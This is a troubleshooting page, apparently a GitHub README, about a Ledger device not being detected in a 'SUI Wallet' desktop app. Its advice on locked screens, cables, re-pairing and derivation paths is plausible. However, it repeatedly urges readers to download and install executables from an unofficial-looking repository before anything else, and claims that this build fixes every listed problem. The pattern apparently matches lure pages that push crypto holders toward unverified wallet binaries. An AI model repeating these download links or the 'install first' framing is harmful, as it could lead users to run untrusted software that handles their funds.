![SUI Wallet](assets/banner-article.png)

# Ledger not detected in SUI Wallet

A cable, a locked screen and a missing device app cause most of these.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

A device that is plugged in but not seen is usually one of three things: it is locked or on the wrong
screen, the Sui app is not open on it, or the connection dropped and needs re-pairing rather than a reset.
The app names which of the three it is looking at, and none of them requires wiping the device.

## Locked device and wrong screen

A locked device answers nothing. Unlock it with the PIN and leave it on the screen the Sui app shows, not on the dashboard and not inside a settings menu, because a device on the wrong screen is indistinguishable from one that is not connected.

The device also locks on its own after a period of inactivity, which is why a pairing that worked a minute
ago can fail now. If the device screen has gone dark, that is the whole problem.

## The Sui app on the device

A Ledger runs one app at a time. If it is sitting in another app, or in the manager, the wallet's request arrives and gets no answer, and the app reports the device as undetected rather than as busy with something else.

Opening the Sui app takes two button presses and fixes the majority of these reports.
[Installing the Sui app on Ledger](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/installing-the-sui-app-on-ledger.md) covers the case where the app is not installed at all.

## The cable and the port

A cable that charges but does not carry data produces exactly this symptom: the device is powered, the screen is on, and the computer sees nothing at all. Try a different cable before trying anything more elaborate, since that is the cheapest test available.

Ports matter less than cables, but hubs and adapters are worth removing from the chain. A direct connection
to the machine is the configuration to test first, and it is the one that tells you whether the problem is
the device or everything between it and the app.

It is worth testing the same cable and device on a second computer before buying anything. If neither machine sees it, the device or the cable is the fault; if only one does, the fault is local to that machine and replacing hardware will not help.

## Re-pairing without a reset

When the device is visible and the app still will not use it, re-pairing is the next step, and it does not
require a reset. Re-pairing re-establishes the handshake; a reset destroys the device's recovery phrase,
which has nothing to do with this wallet and everything to do with the device.

Nothing in this product asks you to reset. If a page or a message does, it is not describing the fix.
[Pairing Ledger with SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/pairing-ledger-with-sui-wallet.md) covers the pairing steps in order, including the state where the
device is waiting for you to approve something on it.

## Derivation path mismatch

A device holding more than one account can answer for several, and the app asks for a specific one. Ask for
a path the device does not hold, and the result looks like a device that is present but empty.

The app separates this from a missing device, which is the point of having three states rather than one
error. If the device is detected and the account is not, the path is the thing to change.

The path is also the answer to a question that arrives after a device is replaced or restored: the same recovery phrase on a new device offers the same paths, so an account that existed before exists again once the matching path is chosen. A path that produces an empty account is a path that does not hold it, not an account that is gone.

## When the device is genuinely faulty

Three signs, and they are worth distinguishing from the cases above. The device does not power on with a
known-good cable. It powers on but no computer sees it, with any cable. Or it disconnects mid-approval
every time, on every port.

In those cases the fault is the device or its cable, and the wallet cannot fix it. Install the current
release from the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest)
first if the app's messages do not match this page, because the reported problems are fixed there and the
state names are part of that.

Before concluding that, check the device's own screen for a prompt. A Ledger asking for confirmation looks idle from the computer's side, and a request waiting on the device is not a fault at all - it is the third state in the pairing article, and it resolves by looking at the device.

## FAQ

### Why is my Ledger not detected?

Most often it is locked, on the wrong app, or on a charge-only cable. Unlock it, open the Sui app, and try
a data cable before anything else.

### Why does the Ledger connect but not send?

Connecting and signing are different steps: the second needs an approval on the device itself. Look at the
device when the app says it is waiting.

### Why does the Ledger stop signing after a firmware update?

Because the connection state was reset by the update. Re-pair the device; there is no need to wipe it.

### Is there a workaround for an old Ledger address?

If the app offers a derivation path that matches the address you had, choose that path rather than creating
a new account. The device can still sign for it.

### Should I reset the device to fix a connection?

No. A reset destroys the device's recovery phrase and fixes nothing about a handshake. Re-pair instead.
